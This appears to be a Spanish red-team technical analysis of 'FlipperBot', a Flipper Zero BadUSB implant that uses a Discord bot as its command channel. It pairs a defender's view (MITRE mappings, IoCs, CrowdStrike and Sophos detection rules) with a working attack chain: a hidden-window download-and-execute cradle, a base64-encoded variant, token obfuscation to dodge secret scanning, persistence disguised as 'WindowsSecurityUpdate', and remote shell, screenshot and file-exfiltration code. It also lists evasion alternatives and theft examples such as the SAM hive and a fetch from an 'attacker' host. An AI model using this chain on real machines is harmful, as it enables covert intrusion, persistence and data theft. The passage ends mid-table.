# FlipperBot - Analisis Tecnico Red Team

## Resumen Ejecutivo

FlipperBot es una herramienta de demostracion ofensiva que combina un dispositivo Flipper Zero (BadUSB) con un bot de Discord como canal de Command & Control. Permite evaluar la postura de seguridad de endpoints corporativos contra ataques de acceso fisico, persistencia, evasion de EDR y exfiltracion de datos.

Cubre **6 de 7 fases del Cyber Kill Chain** y **11 de 14 tacticas MITRE ATT&CK**.

---

## Cadena de Ataque Completa

```
[Flipper Zero BadUSB] --> [PowerShell Download Cradle] --> [Python Portable Install]
        |                          |                              |
   Acceso Fisico            Descarga remota              Instalacion silenciosa
   (T1200)                  (T1059.001/T1105)            (T1105/T1059.006)
                                                              |
                                                    [Registry Run Key]
                                                    Persistencia (T1547.001)
                                                              |
                                                     [Discord Bot C2]
                                                     Canal C2 (T1102.002)
                                                              |
                            +------------------+--------------+---------------+
                            |                  |              |               |
                       !cmd / !ps         !screenshot      !creds        !download
                       Ejecucion          Captura         Credenciales   Exfiltracion
                       (T1059)            (T1113)         (T1555.003)    (T1041)
```

---

## Analisis por Comando

---

### 1. Payload BadUSB (DuckyScript)

**Que hace:** El Flipper Zero se conecta via USB y el sistema lo reconoce como un teclado HID. Escribe automaticamente comandos de PowerShell en la PC victima en segundos.

**Que ejecuta:**
```
GUI                          # Abre el menu de inicio
STRING powershell            # Escribe "powershell"
ENTER                        # Abre PowerShell
STRING Start-Process powershell -WindowStyle Hidden -ArgumentList '-C [TLS fix]; irm [URL] | iex'; exit
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Hardware Additions | T1200 | Initial Access |
| PowerShell | T1059.001 | Execution |
| Hidden Window | T1564.003 | Defense Evasion |

**Alternativas de uso:**
- Desplegar ransomware simulado para ejercicios de respuesta a incidentes
- Instalar agentes de monitoreo en equipos no gestionados
- Ejecutar scripts de auditoria de cumplimiento en estaciones sin acceso remoto
- Simular ataques de insider threat con acceso fisico

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | `powershell.exe` lanzado como hijo de `explorer.exe` (Start Menu) o `RunDlg` (Win+R) |
| Evento | Event ID 4688 (Process Creation) con commandline conteniendo `-WindowStyle Hidden` |
| USB | Nuevo dispositivo HID registrado en `HKLM\SYSTEM\CurrentControlSet\Enum\USB` |
| Evento | Event ID 6416 (PnP device connected) — si auditing de dispositivos esta habilitado |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| USB Device Control | Built-in (Policy) | **Device Control Policy** → se puede crear reglas para bloquear/alertar dispositivos HID nuevos. Requiere configuracion: por defecto NO monitorea teclados USB |
| Suspicious PowerShell | Built-in (Toggle) | **"Suspicious Scripts and Commands"** en Prevention Policy — OFF por defecto. Si se habilita, detecta `-WindowStyle Hidden` |
| Custom IOA | Regla custom | Process Creation: `CommandLine CONTAINS "-WindowStyle Hidden" AND ParentImageFileName CONTAINS "explorer.exe"` |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Peripheral Control | Built-in (Policy) | **Peripheral Control Policy** → se puede bloquear "Removable Media" y "Wireless Devices" pero NO filtra teclados HID especificamente |
| AMSI | Built-in | AMSI en Sophos cubre PowerShell — pero solo si el script es lo suficientemente largo/sospechoso para triggear heuristicas |
| Live Discover | Hunting | Query: `SELECT * FROM sophos_events WHERE event_type = 'USB_DEVICE_CONNECTED'` |

---

### 2. Download Cradle (irm | iex)

**Que hace:** Descarga un script de PowerShell desde GitHub y lo ejecuta directamente en memoria, sin escribir nada en disco.

**Que ejecuta:**
```powershell
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
irm https://raw.githubusercontent.com/.../f44b1874d8cce12b_run.ps1 | iex
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| PowerShell | T1059.001 | Execution |
| Ingress Tool Transfer | T1105 | Command and Control |

**Alternativas de uso:**
- Cambiar `irm` por `Invoke-WebRequest` + `Invoke-Expression` si `irm` esta bloqueado
- Usar `certutil -urlcache` o `bitsadmin` como download cradles alternativos
- Codificar el cradle con `-EncodedCommand` para evadir firmas AMSI
- Usar `mshta`, `regsvr32`, o `rundll32` como LOLBins alternativos

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Red | Conexion HTTPS a `raw.githubusercontent.com:443` desde `powershell.exe` |
| Evento | Event ID 4104 (Script Block Logging) — registra el contenido del script descargado |
| Proceso | `powershell.exe` ejecutando `Invoke-RestMethod` + `Invoke-Expression` |
| Sin disco | El script se ejecuta en memoria — no deja archivo en disco |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Script-Based Execution Monitoring | Built-in (Toggle) | **"Script-Based Execution Monitoring"** en Prevention Policy — analiza scripts PowerShell via AMSI. OFF por defecto |
| Suspicious Scripts and Commands | Built-in (Toggle) | Detecta patrones `irm|iex`, `IEX(IWR(`, etc. OFF por defecto |
| AMSI Integration | Built-in (Toggle) | **"AMSI"** toggle — intercepta contenido antes de ejecucion. OFF por defecto |
| Custom IOA | Regla custom | Process Creation: `CommandLine MATCHES "irm.*\|.*iex"` o `CommandLine CONTAINS "Invoke-Expression"` |
| Network | Built-in | Registra conexiones pero no bloquea `raw.githubusercontent.com` sin Custom IOA de tipo "Domain Name" |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| AMSI | Built-in | Sophos integra AMSI para PowerShell — deberia interceptar `irm|iex` si la heuristica lo marca como malicioso |
| Threat Protection | Built-in | **"Detect malicious behavior"** en Threat Protection Policy — analiza cadenas de ejecucion sospechosas |
| IPS | Built-in | Inspection de trafico de red — puede detectar download cradles conocidos |
| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE cmdline LIKE '%irm%iex%'` |

---

### 3. Comando Codificado en Base64 (-EncodedCommand)

**Que hace:** El payload de Win+R usa `-EncodedCommand` para pasar el comando de PowerShell como base64 UTF-16LE, evitando problemas con caracteres especiales y dificultando la inspeccion visual.

**Que ejecuta:**
```
powershell -NoP -W H -EncodedCommand WwBOAGUAdAAuAF...
```
Que decodifica a:
```powershell
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://raw.githubusercontent.com/.../f44b1874d8cce12b_run.ps1 | iex
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Command Obfuscation | T1027.010 | Defense Evasion |
| Hidden Window | T1564.003 | Defense Evasion |

**Alternativas de uso:**
- Concatenacion de strings: `$a="ir"; $b="m"; & ($a+$b) URL | iex`
- Compresion + base64: `[IO.StreamReader]::new([IO.Compression.GZipStream]::new(...))`
- Variable environment slicing para construir comandos letra por letra
- XOR encoding con clave personalizada

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | `powershell.exe -NoP -W H -EncodedCommand <blob>` — visible en Event ID 4688 |
| Evento | Event ID 4104 — Script Block Logging decodifica y registra el contenido real |
| Registro | Prefetch file `POWERSHELL.EXE-*.pf` actualizado |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Suspicious Scripts and Commands | Built-in (Toggle) | Detecta `-EncodedCommand` como indicador de alta fidelidad. OFF por defecto |
| AMSI | Built-in (Toggle) | Decodifica el base64 y analiza el contenido real antes de ejecucion |
| Custom IOA | Regla custom | Process Creation: `CommandLine CONTAINS "-EncodedCommand" OR CommandLine CONTAINS "-enc"` |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| AMSI | Built-in | Decodifica `-EncodedCommand` y analiza contenido — deberia detectar `irm|iex` dentro |
| Adaptive Attack Protection | Built-in | En modo activo (post-deteccion), bloquea PowerShell con `-EncodedCommand` automaticamente |
| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE cmdline LIKE '%EncodedCommand%'` |

---

### 4. Ofuscacion del Token (Base64)

**Que hace:** El token del bot de Discord se almacena codificado en base64 dentro del script, evitando que GitHub Secret Scanning lo detecte y lo revoque automaticamente.

**Que ejecuta:**
```powershell
$bt=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TVRVeU16QTJ...'))
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Obfuscated Files or Information | T1027 | Defense Evasion |

**Alternativas de uso:**
- Dividir el token en fragmentos y concatenar: `$t1+$t2+$t3`
- Cifrar con AES y usar una clave derivada del hostname
- Almacenar en un registro de Windows o variable de entorno
- Usar esteganografia para ocultar el token en una imagen

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | `FromBase64String()` en el contexto de PowerShell — capturado por Script Block Logging |
| Sin disco | El token decodificado solo existe en memoria como variable `$bt` |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Script-Based Execution Monitoring | Built-in (Toggle) | Puede identificar patrones de decodificacion base64 + uso como credencial |
| No detectable en reposo | — | El token en base64 dentro del .ps1 en GitHub no es analizado por el EDR hasta ejecucion |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| AMSI | Built-in | Analiza el script decodificado — pero `FromBase64String` por si solo no es malicioso |
| No detectable en reposo | — | Sophos no escanea contenido de repositorios remotos |

---

### 5. Instalacion de Python Portable

**Que hace:** Descarga Python embebido (sin instalador), configura pip, e instala las dependencias del bot, todo en `%APPDATA%\FlipperBot\` sin privilegios de administrador.

**Que ejecuta:**
```powershell
# Descarga Python embebido
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile $pyZip
Expand-Archive -Path $pyZip -DestinationPath $pyDir -Force

# Habilita pip
(Get-Content python311._pth) -replace '#import site', 'import site' | Set-Content ...

# Instala dependencias
& python.exe -m pip install discord.py Pillow psutil certifi --quiet
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Ingress Tool Transfer | T1105 | Command and Control |
| Python | T1059.006 | Execution |

**Alternativas de uso:**
- Usar Node.js portable en vez de Python
- Compilar el bot como `.exe` con PyInstaller para eliminar la dependencia de Python
- Usar PowerShell puro sin Python (menos funcionalidad pero cero dependencias)
- Descargar un binario Go compilado estaticamente

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Directorio | `%APPDATA%\FlipperBot\` — contiene python/, bot.py, config.py, creds_extractor.exe |
| Archivo | `%APPDATA%\FlipperBot\python\python.exe` — Python 3.11.9 embebido |
| Archivo | `%APPDATA%\FlipperBot\python\Lib\site-packages\discord\` — discord.py instalado |
| Red | Conexiones a `www.python.org`, `bootstrap.pypa.io`, `pypi.org` desde PowerShell |
| Proceso | `python.exe` ejecutandose desde `%APPDATA%\FlipperBot\python\` |
| Prefetch | `PYTHON.EXE-*.pf` en `C:\Windows\Prefetch` |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Suspicious Processes | Built-in (Toggle) | **"Suspicious Processes"** — puede marcar python.exe ejecutandose desde AppData. OFF por defecto |
| Custom IOA | Regla custom | Process Creation: `ImageFileName MATCHES "\\AppData\\.*\\python\.exe"` |
| Custom IOA | Regla custom | File Creation: `TargetFileName MATCHES "\\AppData\\.*\\python-.*-embed.*"` |
| Application Control | No disponible | CrowdStrike NO tiene whitelist de aplicaciones nativo — no puede bloquear Python portable |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Application Control | Built-in (Policy) | **Application Control Policy** — Python esta en el catalogo de aplicaciones controladas. Si se habilita, bloquea `python.exe` |
| AMSI | Limitacion | **Python NO esta cubierto por AMSI en Sophos** — solo cubre PowerShell, VBScript, JScript. Python ejecuta sin inspeccion AMSI |
| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE process_name = 'python.exe' AND path LIKE '%AppData%'` |

---

### 6. Persistencia via Registry Run Key

**Que hace:** Agrega una entrada en el registro de Windows que relanza el bot automaticamente cada vez que el usuario inicia sesion. El nombre de la clave es `WindowsSecurityUpdate` para parecer legitimo.

**Que ejecuta:**
```powershell
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'WindowsSecurityUpdate' `
    -Value 'powershell -WindowStyle Hidden -Command "& python.exe bot.py"'
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Registry Run Keys / Startup Folder | T1547.001 | Persistence |

**Alternativas de uso:**
- Scheduled Task: `schtasks /create /tn "Update" /tr "..." /sc onlogon`
- WMI Event Subscription (mas sigiloso, T1546.003)
- Startup Folder: copiar un `.lnk` a `shell:startup`
- Servicio de Windows (requiere admin, T1543.003)
- DLL search order hijacking en aplicaciones legitimas (T1574.001)

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Registro | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate` |
| Valor | `powershell -WindowStyle Hidden -Command "& 'C:\Users\<user>\AppData\Roaming\FlipperBot\python\python.exe' 'C:\Users\<user>\AppData\Roaming\FlipperBot\bot.py'"` |
| Evento | Event ID 13 (Sysmon: Registry Value Set) o Event ID 4657 (Security: Registry modification) |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Suspicious Registry Operations | Built-in (Toggle) | **"Suspicious Registry Operations"** — detecta modificaciones en claves Run. OFF por defecto |
| Custom IOA | Regla custom | Registry: `RegObjectName CONTAINS "CurrentVersion\\Run" AND RegValueName = "WindowsSecurityUpdate"` |
| Custom IOA | Regla custom | Process Creation (en boot): `CommandLine CONTAINS "WindowsSecurityUpdate" AND ImageFileName CONTAINS "powershell"` |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Threat Protection | Built-in | **"Detect malicious behavior"** — incluye heuristicas para persistencia en Run keys, pero depende del contexto |
| Adaptive Attack Protection | Built-in | En modo activo, bloquea escrituras a claves Run desde procesos sospechosos |
| Live Discover | Hunting | `SELECT * FROM registry WHERE path LIKE 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\%' AND name = 'WindowsSecurityUpdate'` |

---

### 7. Discord Bot como Canal C2

**Que hace:** Usa la API de Discord como canal de comunicacion bidireccional entre el atacante y el implante. El trafico se mezcla con trafico legitimo de Discord y usa HTTPS/WSS.

**Como funciona:**
```
Atacante (Discord) <--HTTPS/WSS--> discord.com <--HTTPS/WSS--> Bot en PC victima
     |                                                              |
  Envia !cmd whoami                                          Ejecuta y responde
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Web Service: Bidirectional Communication | T1102.002 | Command and Control |
| Application Layer Protocol: Web | T1071.001 | Command and Control |

**Alternativas de uso:**
- Telegram Bot API como C2 alternativo
- Slack Webhooks para exfiltracion unidireccional
- DNS tunneling para entornos donde HTTPS esta inspeccionado
- HTTPS beacon a un servidor propio (Cobalt Strike style)
- GitHub Issues/Gists como dead drop C2

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Red | Conexion WebSocket persistente a `gateway.discord.gg:443` desde `python.exe` |
| Red | Conexiones HTTPS a `discord.com/api/v*` desde `python.exe` |
| DNS | Resoluciones DNS para `discord.com`, `gateway.discord.gg`, `cdn.discordapp.com` |
| Proceso | `python.exe` con conexion de red persistente — no es interactivo (sin ventana) |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Custom IOA | Regla custom | Network Connection: `RemoteAddressIP IN [Discord IP ranges] AND ImageFileName CONTAINS "python.exe"` |
| Custom IOA | Regla custom | Domain Name: `DomainName = "gateway.discord.gg" AND ImageFileName NOT CONTAINS "Discord.exe"` |
| No hay toggle nativo | — | CrowdStrike no tiene toggle especifico para detectar C2 sobre servicios web legitimos — requiere Custom IOA |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Web Control | Built-in (Policy) | **Web Control Policy** — puede categorizar Discord como "File Sharing" y bloquear, pero afecta tambien al uso legitimo |
| IPS | Built-in | Inspeccion de trafico — no detecta WebSocket a Discord como C2 (es trafico HTTPS normal) |
| Application Control | Built-in (Policy) | Puede bloquear Discord como aplicacion, pero NO distingue entre el cliente y un bot Python |
| Live Discover | Hunting | `SELECT * FROM sophos_network_journal WHERE destination LIKE '%discord%' AND process_name = 'python.exe'` |

---

### 8. !ping

**Que hace:** Verifica que el bot esta activo y muestra la latencia al servidor de Discord.

**Que ejecuta:**
```python
latency = round(bot.latency * 1000)  # Latencia del WebSocket
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| (Operacional - no mapea directamente) | — | — |

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Sin IoC adicional | Solo mide latencia del WebSocket ya establecido — no genera artefactos nuevos |

**Deteccion CrowdStrike / Sophos:** No detectable como accion independiente — es trafico normal del WebSocket C2.

**Alternativas de uso:**
- Heartbeat check para monitorear multiples implantes
- Medir calidad de la conexion C2 antes de operaciones grandes

---

### 9. !info

**Que hace:** Recolecta informacion del sistema: hostname, usuario, OS, CPU, RAM, uso de CPU, y tiempo encendida.

**Que ejecuta:**
```python
platform.node()              # Hostname
os.getlogin()                # Usuario actual
platform.platform()          # OS completo
platform.processor()         # CPU
psutil.virtual_memory()      # RAM total y usada
psutil.cpu_percent()         # Uso de CPU
psutil.boot_time()           # Uptime
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| System Information Discovery | T1082 | Discovery |
| System Owner/User Discovery | T1033 | Discovery |

**Alternativas de uso:**
- Agregar enumeracion de red: `Get-NetIPAddress`, `Get-NetTCPConnection`
- Listar software instalado para identificar vectores adicionales
- Detectar si es una VM/sandbox (T1497)
- Enumerar grupos y privilegios del usuario (T1069)

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | Llamadas a WMI/API del sistema (`platform.*`, `psutil.*`) desde `python.exe` |
| Red | Respuesta enviada via Discord API — datos del sistema en texto plano en el canal C2 |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| No detectable | — | Consultas de informacion del sistema son operaciones normales de cualquier proceso — no hay toggle ni IOA util |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| No detectable | — | `psutil` y `platform` son llamadas de sistema normales — no triggerean ningun mecanismo de deteccion |
| Live Discover | Hunting | No practico — la enumeracion de sistema es demasiado comun para crear reglas utiles |

---

### 10. !screenshot

**Que hace:** Captura una imagen de toda la pantalla y la envia como archivo PNG al canal de Discord.

**Que ejecuta:**
```python
from PIL import ImageGrab
img = ImageGrab.grab()       # Captura toda la pantalla
buf = io.BytesIO()
img.save(buf, format="PNG")  # Convierte a PNG en memoria
# Envia como archivo adjunto a Discord
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Screen Capture | T1113 | Collection |

**Alternativas de uso:**
- Captura de ventana especifica en vez de pantalla completa
- Grabacion de video continua con intervalo configurable
- Captura de clipboard (T1115)
- Keylogger para capturar texto escrito (T1056.001)

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | `python.exe` llamando a `ImageGrab.grab()` (Win32 API: `BitBlt`/`GetDC`) |
| Red | Archivo PNG enviado como upload a Discord API (`discord.com/api/*/channels/*/messages`) |
| Memoria | Imagen existe solo en memoria (BytesIO) — no se escribe a disco |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| No hay toggle especifico | — | CrowdStrike no tiene toggle para captura de pantalla. La API `BitBlt`/`GetDC` es usada por aplicaciones legitimas |
| Custom IOA | Dificil | No hay tipo de IOA que cubra llamadas a GDI/screen capture — solo Process/File/Network/Registry |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| No detectable | — | Sophos no monitorea llamadas a APIs de captura de pantalla |
| Exploit Mitigation | Built-in | Solo aplica a procesos protegidos (navegadores, Office) — Python no esta en la lista |

---

### 11. !say [texto]

**Que hace:** Usa el sintetizador de voz de Windows (SAPI) para que la PC hable el texto enviado en voz alta.

**Que ejecuta:**
```powershell
Add-Type -AssemblyName System.Speech
$s = New-Object System.Speech.Synthesis.SpeechSynthesizer
$s.Speak("texto del atacante")
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| PowerShell | T1059.001 | Execution |
| Internal Defacement | T1491.001 | Impact |

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | `powershell.exe` hijo de `python.exe` — carga `System.Speech` assembly |
| Audio | Speaker del sistema produce audio — observable fisicamente |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Custom IOA | Regla custom | Process Creation: `ParentImageFileName CONTAINS "python.exe" AND CommandLine CONTAINS "System.Speech"` |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| No detectable | — | Cargar `System.Speech` no es malicioso — es un assembly .NET legitimo |

**Alternativas de uso:**
- Demostracion de impacto en presentaciones de concientizacion
- Distraccion del usuario mientras se ejecutan otros comandos
- Social engineering: hacer que la PC "hable" mensajes que parezcan del sistema

---

### 12. !notify [titulo] | [mensaje]

**Que hace:** Muestra una notificacion toast de Windows con titulo y mensaje personalizado.

**Que ejecuta:**
```powershell
Add-Type -AssemblyName System.Windows.Forms
$n = New-Object System.Windows.Forms.NotifyIcon
$n.Icon = [System.Drawing.SystemIcons]::Information
$n.Visible = $true
$n.ShowBalloonTip(5000, 'titulo', 'mensaje', [System.Windows.Forms.ToolTipIcon]::Info)
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Internal Defacement | T1491.001 | Impact |

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | `powershell.exe` hijo de `python.exe` — carga `System.Windows.Forms` |
| UI | Notificacion toast visible para el usuario — puede alertar a la victima |

**Deteccion CrowdStrike / Sophos:** Mismo que `!say` — PowerShell hijo de Python con assembly .NET. No hay deteccion especifica para notificaciones toast.

**Alternativas de uso:**
- Phishing interno: "Su sesion ha expirado, haga clic para renovar"
- Distraccion del usuario durante exfiltracion
- Simular alertas del sistema para inducir acciones del usuario

---

### 13. !cmd [comando]

**Que hace:** Ejecuta cualquier comando del sistema operativo a traves de `cmd.exe` y devuelve el output completo al canal de Discord.

**Que ejecuta:**
```python
subprocess.run(
    "cmd /C " + comando,     # Ejecuta via cmd.exe
    capture_output=True,      # Captura stdout y stderr
    text=True,
    timeout=60,               # Timeout de 60 segundos
    shell=True,
)
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Windows Command Shell | T1059.003 | Execution |

**Ejemplos de uso ofensivo:**
```
!cmd whoami /all                    # Privilegios del usuario
!cmd net user                       # Usuarios locales
!cmd net localgroup administrators  # Admins locales
!cmd netstat -ano                   # Conexiones de red
!cmd tasklist /v                    # Procesos detallados
!cmd reg query HKLM\SOFTWARE       # Enumerar registro
!cmd type C:\confidencial.txt      # Leer archivos
!cmd dir /s /b *.pdf               # Buscar archivos PDF
```

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | `cmd.exe` como hijo de `python.exe` (en AppData) — cadena: python.exe → cmd.exe |
| Evento | Event ID 4688 — muestra `cmd /C <comando>` con el comando completo |
| Resultado | Output del comando viaja por HTTPS a Discord API — exfiltrado automaticamente |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Suspicious Processes | Built-in (Toggle) | Puede detectar `cmd.exe` lanzado desde un proceso no estandar en AppData |
| Custom IOA | Regla custom | Process Creation: `ParentImageFileName MATCHES "\\AppData\\.*python\.exe" AND ImageFileName CONTAINS "cmd.exe"` |
| Custom IOA | Regla custom | Process Creation: `CommandLine MATCHES "(whoami|net user|netstat|tasklist)" AND ParentImageFileName CONTAINS "python.exe"` — detecta reconocimiento |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Threat Protection | Built-in | **"Detect malicious behavior"** — puede detectar cadenas de procesos sospechosas (python → cmd) |
| Adaptive Attack Protection | Built-in | En modo activo, puede bloquear `cmd.exe` lanzado desde procesos no confiables |
| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE parent_name = 'python.exe' AND process_name = 'cmd.exe'` |

---

### 14. !ps [comando]

**Que hace:** Ejecuta comandos de PowerShell con toda su funcionalidad (cmdlets, pipeline, .NET).

**Que ejecuta:**
```python
subprocess.run(
    "powershell -NoProfile -Command " + comando,
    capture_output=True,
    text=True,
    timeout=60,
    shell=True,
)
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| PowerShell | T1059.001 | Execution |

**Ejemplos de uso ofensivo:**
```
!ps Get-Process                                    # Procesos
!ps Get-NetTCPConnection                           # Conexiones TCP
!ps Get-LocalUser                                  # Usuarios locales
!ps Get-ChildItem Env:                             # Variables de entorno
!ps Get-WmiObject Win32_Product                    # Software instalado
!ps Get-ItemProperty HKLM:\SOFTWARE\...            # Leer registro
!ps Get-Content C:\Windows\System32\drivers\etc\hosts  # Archivo hosts
!ps Invoke-WebRequest -Uri http://attacker/tool -OutFile C:\temp\tool.exe  # Descargar herramienta
```

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Proceso | `powershell.exe -NoProfile -Command <cmd>` como hijo de `python.exe` |
| Evento | Event ID 4104 (Script Block Logging) — captura cada comando ejecutado |
| Evento | Event ID 4688 — muestra la linea de comandos completa |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Script-Based Execution Monitoring | Built-in (Toggle) | Captura y analiza cada bloque de script PowerShell ejecutado |
| AMSI | Built-in (Toggle) | Intercepta comandos PowerShell antes de ejecucion |
| Suspicious Scripts and Commands | Built-in (Toggle) | Detecta cmdlets ofensivos conocidos como `Invoke-WebRequest`, `Get-WmiObject` en contexto sospechoso |
| Custom IOA | Regla custom | Process Creation: `ParentImageFileName CONTAINS "python.exe" AND ImageFileName CONTAINS "powershell.exe" AND CommandLine CONTAINS "-NoProfile"` |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| AMSI | Built-in | Cubre PowerShell — analiza cada comando. Efectividad depende de heuristicas (cmdlets comunes pasan) |
| Threat Protection | Built-in | Cadena python.exe → powershell.exe es sospechosa — depende de sensitivity level |
| Live Discover | Hunting | `SELECT * FROM sophos_process_journal WHERE parent_name = 'python.exe' AND process_name = 'powershell.exe'` |

---

### 15. !download [ruta]

**Que hace:** Lee un archivo de la PC victima y lo envia como adjunto al canal de Discord (exfiltracion).

**Que ejecuta:**
```python
# Expande variables de entorno y lee el archivo
path = os.path.expandvars(os.path.expanduser(ruta))
# Envia como adjunto de Discord (limite 25 MB)
await ctx.send(file=discord.File(path))
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Exfiltration Over C2 Channel | T1041 | Exfiltration |

**Ejemplos de uso ofensivo:**
```
!download %USERPROFILE%\Desktop\passwords.xlsx
!download C:\Users\admin\Documents\financiero.pdf
!download %APPDATA%\Microsoft\Credentials\*
!download C:\Windows\System32\config\SAM          # Requiere SYSTEM
```

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Archivo | Archivo leido por `python.exe` — visible en file access logs (Sysmon Event ID 11) |
| Red | Archivo enviado como multipart upload a `discord.com/api/*/channels/*/messages` |
| Proceso | `python.exe` abriendo archivos fuera de su directorio de trabajo |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Custom IOA | Regla custom | File Read (no disponible como IOA type) — CrowdStrike Custom IOA NO soporta "file read" como evento, solo file creation/write |
| Sensor Visibility | Telemetria | El sensor registra accesos a archivos — visible en Investigate pero no como prevencion automatica |
| No prevenible nativamente | — | Sin regla custom que combine "python.exe lee archivo + envia datos a discord.com" |

**Deteccion Sophos:**
| Capacidad | Tipo | Detalle |
|---|---|---|
| Data Loss Prevention | No incluido | Sophos Intercept X NO incluye DLP nativo — no puede detectar exfiltracion de archivos por contenido |
| Live Discover | Hunting | `SELECT * FROM sophos_network_journal WHERE process_name = 'python.exe' AND bytes_sent > 100000 AND destination LIKE '%discord%'` |

---

### 16. !upload [ruta destino]

**Que hace:** Recibe un archivo adjunto en Discord y lo guarda en la ruta especificada de la PC victima (ingress de herramientas).

**Que ejecuta:**
```python
# Descarga el adjunto de Discord via aiohttp (bypass SSL)
async with aiohttp.ClientSession() as session:
    async with session.get(attachment.url, ssl=ssl_ctx) as resp:
        data = await resp.read()
# Escribe en la ruta destino
with open(dest, 'wb') as f:
    f.write(data)
```

**TTPs MITRE ATT&CK:**

| Tecnica | ID | Tactica |
|---|---|---|
| Ingress Tool Transfer | T1105 | Command and Control |

**Ejemplos de uso ofensivo:**
```
!upload C:\temp\mimikatz.exe           # Subir herramienta
!upload C:\Users\Public\backdoor.ps1   # Subir script
!upload %APPDATA%\config.dat           # Subir configuracion
```

**Nota:** Actualmente bloqueado por el proxy SSL corporativo (403 en cdn.discordapp.com). Esto es un hallazgo positivo — el proxy SSL esta cumpliendo su funcion de inspeccion.

**IoCs en la PC victima:**
| Tipo | Detalle |
|---|---|
| Archivo | Archivo escrito en la ruta destino por `python.exe` |
| Red | Descarga desde `cdn.discordapp.com` (actualmente bloqueado por proxy — 403) |
| Proceso | `python.exe` escribiendo archivos fuera de su directorio |

**Deteccion CrowdStrike:**
| Capacidad | Tipo | Detalle |
|---|---|---|
